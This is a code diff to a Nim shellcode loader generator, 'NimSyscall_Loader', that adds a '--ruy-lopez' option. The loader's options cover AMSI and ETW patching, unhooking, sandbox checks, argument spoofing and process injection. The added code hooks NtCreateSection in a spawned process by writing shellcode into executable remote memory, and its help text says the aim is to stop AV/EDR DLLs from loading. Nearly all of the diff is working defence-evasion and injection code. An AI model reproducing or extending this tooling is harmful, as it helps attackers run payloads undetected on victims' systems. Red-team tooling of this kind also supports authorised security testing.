@@ -66,7 +66,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.9
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath>]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -175,6 +175,7 @@ Options:
   --mapSection    Map the shellcode into via NtCreateSection/NtMapViewOfSection . For remote injection decryption will happen AFTER writing the Shellcode into the remote process
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
+          --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loadied into the newly spawned process.
       --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                          Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
       --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
@@ -225,8 +226,9 @@ var
     cpl: bool = false
     replaceNimMain: bool = false
     big: bool
-    sourceonly: bool = false#
+    sourceonly: bool = false
     service: bool = false
+    ruylopez: bool = false
     remoteprocesses : seq[string]
     existingprocessInjection: bool = false
     targetdomain : string = ""
@@ -333,6 +335,9 @@ if args["--stegofile"]:
         retrieveFromURL = true
     stegofile = stfile
     echo "Stego file: " & stegofile
+
+if args["--ruy-lopez"]:
+    ruylopez = true
 
 if args["--noDefaultSandBox"]:
     defaultSandBoxChecks = false
@@ -729,6 +734,9 @@ if(service):
     # For some reason, started services have the being debugged flag set or this check breaks the service, so we disable it
     antidebug = false
 
+if ((remoteinject == false) and ruylopez):
+    echo "Error: Ruy-Lopez can currently only be used in combination with --remoteinject"
+    quit(1)
 
 #echo "Key: " & envkey
 # Lets save the last 4 characters of the string in a new variable
@@ -1608,7 +1616,10 @@ import strformat
 from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
 import strutils
 import ptr_math
-#from dynlib import LibHandle, loadLib
+when defined(ruylopez):
+    import dynlib
+    import Hook
+    import RuyGetSyscallStub
 # something seams to be still missing here
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
 #from winim/lean import FARPROC,NtClose,VirtualAllocEx,NT_SUCCESS
@@ -2433,7 +2444,7 @@ let NotepadProcIDStub * = fmt"""
                     sizeof(ppHandle),
                     NULL,
                     NULL)
-
+        
         status = CreateProcess(
             NULL,
             cast[LPWSTR](tProcPath),
@@ -2452,6 +2463,110 @@ let NotepadProcIDStub * = fmt"""
 
     StartProcess()
 
+    when defined(ruylopez):
+
+        var ntdll: LibHandle = loadLib(obf("ntdll"))
+
+        var ntCreateSectionHandle: pointer = ntdll.symAddr(obf("NtCreateSection")) # equivalent of GetProcAddress()
+        
+        when defined(verbose):
+            echo obf("[*] Injecting Shellcode for the hook into the remote process: "), remoteProcID
+
+        const hookShellcode = slurp"ruylopez.bin"
+
+        var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)
+
+        # Allocate memory in which the Shellcode will be written later on after restoring the original NtCreateSection bytes
+
+        var rPtr: LPVOID
+        var status: NTSTATUS
+        var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
+
+        status = NtAllocateVirtualMemory(
+            tProcess, &rPtr, 0, &sc_size, 
+            MEM_COMMIT, 
+            PAGE_EXECUTE_READWRITE);
+
+        when defined(verbose):
+            if(status == 0):
+                echo obf("[+] NtAllocateVirtualMemory success!")
+            else:
+                echo obf("[-] NtAllocateVirtualMemory failed!")
+                quit(1)
+
+        when defined(verbose):
+            if(rPtr != nil):
+                echo obf("[+] Successfully allocated remote process memory for the shellcode")
+            else:
+                echo obf("[-] Memory allocation for remote process failed!")
+                quit(1)
+
+        var buffers: HookTrampolineBuffers
+
+        var addressToHook: LPVOID = cast[LPVOID](ntCreateSectionHandle)
+        ntCreate_Address = cast[HANDLE](ntCreateSectionHandle)
+        var output: bool = false
+
+        if (ntCreate_Address == 0):
+            quit(1)
+            
+        buffers.previousBytes = cast[HANDLE](ntCreate_Address)
+        buffers.previousBytesSize = DWORD(sizeof(ntCreate_Address))
+        g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
+        var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
+        copyMem(PointerToOrigBytes, addressToHook, 24)
+        
+        when defined(verbose):
+            echo obf("[*] Writing allocated Shellcode address "), repr(rPtr), obf(" into Original NtCreateSection address as hook: ")
+
+        output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
+
+        when defined(verbose):
+            if(output):
+                echo obf("[+] Remotely Hooked NtCreateSection: "), output
+            else:
+                echo obf("[-] Remote Hook failed!")
+                quit(1)
+
+
+        # We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
+        # To do that, we need to find the egg in the Shellcode and replace it with the original bytes.
+        when defined(verbose):
+            echo obf("[*] Searching for egg in the shellcode...")
+
+        var eggIndex = 0
+        for i in 0 ..< hookShellcodeBytes.len:
+            if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
+                when defined(verbose):
+                    echo obf("[+] Found egg at index: "), i
+                eggIndex = i
+                break
+
+        # Write the original bytes into the egg
+        when defined(verbose):
+            echo obf("[*] Modifying shellcode to add original NtCreateSection bytes")
+        copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
+        when defined(verbose):
+            echo obf("[*] Done.")
+
+        # Finally write the shellcode into the remote process
+        var bytesWritten: SIZE_T
+
+        status = NtWriteVirtualMemory(
+                tProcess, 
+                rPtr, 
+                unsafeAddr hookShellcodeBytes[0], 
+                sc_size-1, 
+                addr bytesWritten);
+
+        when defined(verbose):
+            if (status == 0):
+                echo obf("[+] NtWriteVirtualMemory: "), status
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo ""
+            else:
+                echo obf("[-] NtWriteVirtualMemory failed!")
+                quit(1)
 
     when defined(verbose):
         echo obf("[*] Sleeping in between for: "), {sleepinbetween}
@@ -3030,6 +3145,9 @@ if(useQueueAPC):
 
 if(not defaultSandBoxChecks):
     basicCompileFlags.add("-d:SkipDefaultSandBoxChecks ")
+
+if(ruylopez):
+    basicCompileFlags.add("-d:ruylopez ")
 
 if(ETW):
     basicCompileFlags.add("-d:HardwareETW ")
